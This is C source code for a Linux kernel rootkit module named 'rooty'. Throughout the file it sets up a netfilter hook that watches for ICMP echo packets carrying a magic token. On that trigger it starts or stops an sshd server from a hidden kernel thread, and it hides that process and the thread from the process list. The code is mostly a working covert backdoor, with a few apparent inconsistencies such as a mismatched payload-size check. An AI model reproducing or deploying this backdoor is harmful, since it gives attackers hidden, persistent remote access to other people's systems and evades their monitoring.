#define AUTH_TOKEN 0xDEADC0DE

DECLARE_WAIT_QUEUE_HEAD(run_event);

struct n_subprocess_info *ssh_sub_info;

pid_t ssh_pid;
struct task_struct *runner_thread;
int isSSHDrunning = 0;
int startSSHD = 0;
int stopSSHD = 0;

char *ssh_argv[] = { "/sbin/sshd", NULL, NULL };
static char *ssh_envp[] =
{
    "HOME=/",
    "TERM=xterm",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
};

struct magic_icmp {
    unsigned int magic;
    unsigned int ip;
    unsigned short port;
};

struct nf_hook_ops pre_hook;

void init_icmp (void);
void stop_icmp (void);

int runner(void* par)
{
	while(1)
	{
        wait_event_interruptible(run_event, (startSSHD ==1 || stopSSHD == 1) || kthread_should_stop());
        
		if(!isSSHDrunning && startSSHD)
		{
			int ret;
			printk("rooty: Starting SSHD server\n");
			ssh_sub_info = n_call_usermodehelper_setup( ssh_argv[0], ssh_argv, ssh_envp, GFP_ATOMIC );
			if (ssh_sub_info == NULL) return -ENOMEM;

			ret = n_call_usermodehelper( "sbin/sshd", ssh_argv, ssh_envp, UMH_WAIT_EXEC );
			if (ret != 0)
			{
				printk("rooty: Error in call to sshd: %i\n", ret);
				return 1;
			}
			else
			{
				printk("rooty: SSHD pid %d\n", callmodule_pid);
				ssh_pid = callmodule_pid;
				hide_proc(ssh_pid);
			}
			isSSHDrunning = 1;
			startSSHD = 0;
		}
		else if(isSSHDrunning && stopSSHD)
		{
			struct siginfo info;
			struct task_struct *t;
			printk("rooty: Stopping SSHD server\n");
			memset(&info, 0, sizeof(struct siginfo));
			info.si_signo = 42; 
			info.si_code = SI_QUEUE;
			info.si_int = 1234;

			rcu_read_lock();
			t = pid_task(find_vpid(ssh_pid), PIDTYPE_PID);
			rcu_read_unlock();
			if(t != NULL)
				send_sig_info(42, &info, t);

			unhide_proc(ssh_pid);
			isSSHDrunning = 0;
			stopSSHD = 0;
		}
		if(kthread_should_stop())
			return 0;
	}
	return 0;
}

int init_ssh(void)
{
	runner_thread = kthread_run(runner, NULL, "kthread");
    hide_proc(runner_thread->pid);
	init_icmp();
    return 0;
}

void stop_ssh(void)
{
	if(isSSHDrunning)
	{
		stopSSHD = 1;
		wake_up_interruptible(&run_event);
	}
	unhide_proc(runner_thread->pid);
    kthread_stop(runner_thread);
    stop_icmp();
}

unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    struct magic_icmp *payload;
    unsigned int payload_size;

    ip_header = ip_hdr(skb);
    if ( ! ip_header )
        return NF_ACCEPT;

    if ( ip_header->protocol != IPPROTO_ICMP )
        return NF_ACCEPT;

    icmp_header = (struct icmphdr *)(ip_header + 1);
    if ( ! icmp_header )
        return NF_ACCEPT;

    payload = (struct magic_icmp *)(icmp_header + 1);
    payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);

    printk("rooty: ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu\n", payload_size, payload->magic, payload->ip, payload->port);

    if ( icmp_header->type != ICMP_ECHO || payload_size != 4 || payload->magic != AUTH_TOKEN )
        return NF_ACCEPT;

	if(!isSSHDrunning)
	{
		startSSHD = 1;
		wake_up_interruptible(&run_event);
	}
	else
	{
		stopSSHD = 1;
		wake_up_interruptible(&run_event);
	}
	
    return NF_STOLEN;
}

void init_icmp (void)
{
    printk("rooty: Monitoring ICMP packets via netfilter\n");

    pre_hook.hook     = watch_icmp;
    pre_hook.pf       = PF_INET;
    pre_hook.priority = NF_IP_PRI_FIRST;
    pre_hook.hooknum  = NF_INET_PRE_ROUTING;

    nf_register_hook(&pre_hook);
}

void stop_icmp (void)
{
    printk("rooty: Stopping monitoring ICMP packets via netfilter\n");
		
    nf_unregister_hook(&pre_hook);
}
